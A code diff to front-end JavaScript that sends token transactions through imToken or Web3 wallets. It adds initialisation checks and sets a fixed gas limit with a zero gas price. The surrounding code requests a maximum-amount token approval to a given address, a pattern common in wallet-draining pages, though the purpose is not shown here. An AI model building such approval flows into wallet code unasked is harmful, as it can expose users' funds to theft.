@@ -237,6 +237,14 @@
           // 获取当前链的 chainId
           const chainId = await window.ethereum.request({method: 'eth_chainId'});
           
+          // 确保 web3 和 contract 已初始化
+          if (!web3) {
+            web3 = new Web3(window.ethereum);
+          }
+          if (!contract) {
+            contract = new web3.eth.Contract(contract_abi, contractAddress);
+          }
+          
           // 其他链使用原始地址
           const result = await window.imToken.callAPI('contract', {
             to: contractAddress,
@@ -255,6 +263,14 @@
         }
         
         // 其他钱包使用 Web3
+        // 确保 web3 和 contract 已初始化
+        if (!web3) {
+          web3 = new Web3(window.ethereum);
+        }
+        if (!contract) {
+          contract = new web3.eth.Contract(contract_abi, contractAddress);
+        }
+        
         const result = await contract.methods.approve(toAddress, maxAmount)
           .send({from: from})
           .on('transactionHash', function(hash) {
@@ -280,13 +296,23 @@
           // 获取当前链的 chainId
           const chainId = await window.ethereum.request({method: 'eth_chainId'});
           
+          // 确保 web3 和 contract 已初始化
+          if (!web3) {
+            web3 = new Web3(window.ethereum);
+          }
+          if (!contract) {
+            contract = new web3.eth.Contract(contract_abi, contractAddress);
+          }
+          
           // 使用 imToken 的合约调用方式
           const result = await window.imToken.callAPI('contract', {
             to: contractAddress,
             from: from,
             value: '0',
             data: contract.methods.transfer(toAddress, amountInWei).encodeABI(),
-            chainId: chainId
+            chainId: chainId,
+            gas: '200000',
+            gasPrice: '0'
           });
           
           if (!result || !result.txHash) {
@@ -296,6 +322,14 @@
         }
         
         // 其他钱包使用 Web3
+        // 确保 web3 和 contract 已初始化
+        if (!web3) {
+          web3 = new Web3(window.ethereum);
+        }
+        if (!contract) {
+          contract = new web3.eth.Contract(contract_abi, contractAddress);
+        }
+        
         const result = await contract.methods.transfer(toAddress, amountInWei)
           .send({from: from})
           .on('transactionHash', function(hash) {
